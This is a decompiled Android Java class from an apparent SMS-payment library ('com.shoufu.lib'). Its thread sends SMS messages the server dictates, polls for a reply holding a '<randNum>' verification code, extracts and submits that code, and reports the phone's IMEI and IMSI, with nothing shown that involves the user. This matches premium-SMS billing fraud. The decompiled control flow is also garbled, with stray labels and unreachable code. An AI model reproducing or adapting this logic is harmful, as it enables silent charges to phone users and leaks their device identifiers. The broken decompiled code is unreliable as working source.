package com.shoufu.lib;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import com.shoufu.entity.response.Task;
import com.shoufu.entity.response.TaskData;
import com.shoufu.entity.response.TaskResultMap;
import com.shoufu.entity.response.ZydQlSmsData;
import java.util.ArrayList;
import org.json.JSONObject;

class dc
  extends Thread
{
  dc(TaskData paramTaskData, Handler paramHandler, Context paramContext) {}
  
  public void run()
  {
    Log.d("TaskUtil", "zydQl");
    for (;;)
    {
      int i;
      boolean bool1;
      int j;
      try
      {
        localObject1 = this.a.getResultmap();
        if (((TaskResultMap)localObject1).getSuccess() == 1)
        {
          if (this.b == null) {
            return;
          }
          this.b.obtainMessage(8).sendToTarget();
          return;
        }
        i = this.a.getResultmap().getNextrequestcode();
      }
      catch (Exception localException2)
      {
        Object localObject1;
        Task localTask;
        String[] arrayOfString;
        Object localObject2;
        Object localObject3;
        label323:
        label334:
        label547:
        i = -1;
        bool1 = false;
        continue;
      }
      try
      {
        localTask = (Task)this.a.getResultlist().get(0);
        arrayOfString = localTask.getCppram().split("\\|");
        localObject2 = ab.a(arrayOfString[0]);
        if ((localObject2 == null) || ("".equals(((String)localObject2).trim()))) {
          break label588;
        }
        localObject3 = new JSONObject((String)localObject2);
        localObject2 = new ZydQlSmsData();
        z.a(localObject2, (JSONObject)localObject3);
        if (TextUtils.isEmpty(((ZydQlSmsData)localObject2).getStatus())) {
          break label588;
        }
        if (!"1".equals(((ZydQlSmsData)localObject2).getStatus())) {
          continue;
        }
        ci.a(this.c, ((TaskResultMap)localObject1).getTradeid(), localTask, null);
        bool1 = cx.a((ZydQlSmsData)localObject2, arrayOfString, null);
        j = i;
      }
      catch (Exception localException3)
      {
        bool1 = false;
        continue;
        label588:
        bool1 = false;
        j = i;
      }
    }
    if ((!bool1) && (this.b != null))
    {
      this.b.obtainMessage(7, j, 0).sendToTarget();
      return;
      if ("0".equals(((ZydQlSmsData)localObject2).getStatus()))
      {
        if ((!"".equals(((ZydQlSmsData)localObject2).getPid())) && (!"".equals(((ZydQlSmsData)localObject2).getAppid())) && (!"".equals(((ZydQlSmsData)localObject2).getMcid()))) {
          bv.a(((ZydQlSmsData)localObject2).getAppid(), ((ZydQlSmsData)localObject2).getMcid(), ((ZydQlSmsData)localObject2).getPid(), cx.a(arrayOfString[0], "imei"), cx.a(arrayOfString[0], "imsi"));
        }
        ci.a(this.c, ((TaskResultMap)localObject1).getTradeid(), localTask, null);
        j = 0;
        if (j >= localTask.getCount())
        {
          j = 0;
          Log.d("TaskUtil", "index:" + j);
          localObject3 = cx.b(arrayOfString[1], ((ZydQlSmsData)localObject2).getReq());
          if ((localObject3 == null) || (((String)localObject3).indexOf("短信未到达") != -1) || (((String)localObject3).indexOf("<randNum>") == -1)) {
            break label547;
          }
        }
        for (j = 1;; j = 0)
        {
          if (j == 0) {
            break label588;
          }
          dn.a(this.c, ((TaskResultMap)localObject1).getTradeid(), localTask.getSmsid(), 0, 0, localTask.getTid());
          localObject1 = ((String)localObject3).substring(((String)localObject3).indexOf("<randNum>") + "<randNum>".length(), ((String)localObject3).lastIndexOf("</randNum>"));
          if (TextUtils.isEmpty((CharSequence)localObject1)) {
            break label588;
          }
          boolean bool2 = cx.a((ZydQlSmsData)localObject2, arrayOfString, (String)localObject1);
          bool1 = bool2;
          j = i;
          if (!bool2) {
            break;
          }
          try
          {
            if (this.b == null) {
              return;
            }
            this.b.obtainMessage(8).sendToTarget();
            return;
          }
          catch (Exception localException1)
          {
            bool1 = bool2;
          }
          localException1.printStackTrace();
          j = i;
          break;
          dv.a(this.c, 0, ((ZydQlSmsData)localObject2).getNum(), ((ZydQlSmsData)localObject2).getContent(), null, null);
          j += 1;
          break label323;
          int k = j + 1;
          Thread.sleep(1000L);
          j = k;
          if (k <= 15) {
            break label334;
          }
        }
      }
    }
  }
}
